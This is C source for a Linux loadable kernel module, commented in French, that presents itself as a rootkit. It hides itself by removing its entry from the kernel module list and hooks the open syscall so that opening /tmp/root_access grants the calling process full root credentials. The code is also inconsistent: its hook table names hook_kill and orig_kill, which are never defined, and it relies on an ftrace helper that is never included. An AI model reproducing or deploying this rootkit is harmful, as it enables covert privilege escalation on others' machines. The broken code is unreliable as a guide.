#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

// licence du module (GPL = General Public License) en gros opensource
// le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
MODULE_LICENSE("GPL");
MODULE_AUTHOR("victor, marouane, mina, axel");
// pour avoir la description quand on fait modinfo 
MODULE_DESCRIPTION("Hide LKM");
MODULE_VERSION("0.01");

  /////////////////////////////////////////
 ////////////// HIDE LKM /////////////////
/////////////////////////////////////////


// list_head -> double liste chainé utilisé par le kernel
// ca prends un .prev et .next mais on peut utiliser list_del() et list_add() pour ajouter/enlever des items de la struct list_head
// on doit juste garder une copie locale de l'item qu'on enlève au debut pour pouvoir le rajouter a la fin quand on a fini
static struct list_head *prev_module;
// 0 = visible, 1 = hidden
static short hidden = 0;

void showme(void)
{
    // on ajoute le module dans la liste des modules
    list_add(&THIS_MODULE->list, prev_module);
    //on set hidden a 0 pour dire que le module est visible
    hidden = 0;
}

void hideme(void)
{
    // on garde une copie du pointeur vers le module précédent (pour pouvoir le retrouver et le remettre a la bonne position quand on voudra le rajouter dans la liste)
    prev_module = THIS_MODULE->list.prev;
    // on supp le module de la liste des modules
    list_del(&THIS_MODULE->list);
    // on set hidden a 1 pour dire que le module est caché
    hidden = 1; 
}

  /////////////////////////////////////////
 //// GIVE ROOT PRIVILEGE TO A USER //////
/////////////////////////////////////////

// si PTREGS_SYSCALL_STUBS est défini, on inclut les stubs pour les syscall
#ifdef PTREGS_SYSCALL_STUBS
// Pointeur vers la f° open pour save ses fonction d'origine
static asmlinkage long (*orig_open)(const struct pt_regs *);

// f° hooké qui remplace le syscall kill
asmlinkage int hook_open(const struct pt_regs *regs)
{
    void set_root(void);

    // Obtenir le nom du fichier que l'utilisateur essaie d'ouvrir
    char __user *filename = (char *) regs->di;

    // Vérifier si le fichier demandé est /tmp/root_access
    if (strcmp(filename, "/tmp/root_access") == 0)
    {
        printk(KERN_INFO "rootkit: Giving root privilege ...\n");
        set_root();
        return 0;
    }

    // si c'est pas le bon fichier, on appelle la f° d'origine
    return orig_open(regs);
}

#else
static asmlinkage long (*orig_open)(const char __user *filename, int flags, mode_t mode);

static asmlinkage int hook_open(const char __user *filename, int flags, mode_t mode)
{
    void set_root(void);

    if (strcmp(filename, "/tmp/root_access") == 0)
    {
        printk(KERN_INFO "rootkit: Giving root access via open...\n");
        set_root();
        return 0;
    }

    return orig_open(filename, flags, mode);
}
#endif
void set_root(void)
{
    struct cred *root;
    // on récupère les credentials actuels du processus (uid, gid, etc)
    root = prepare_creds();

    if (root == NULL)
        return;
    
    // on mets tout a 0, ducoup on est root :)
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    // ca c'est pour appliquer "réellement" les changements
    commit_creds(root);
}

// tableau de struct ftrace_hook pour def l'appel qu'on veut hook
static struct ftrace_hook hooks[] = {
    // ici on appel la f° __x64_sys_kill et on lui passe notre f° hook_kill
    // &orig_kill est un pointeur vers la f° d'origine pour la réutiliser si le flag est pas 64
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

// fonction éxécuté quand on charge le module dans le noyau
// __init ->  utilisé qu'à l'initialisation et que le code sera libéré après cette phase pour économiser de la mémoire
static int __init rootkit_init(void)
{
    // hide the LKM
    hideme();

    // give root privilege to a user
    int err;
    // installe les hooks (la f° est dans ftrace_helper.h)
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    return 0;
}

// fonction éxécuté quand on décharge le module du noyau
static void __exit rootkit_exit(void)
{
    showme();
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);
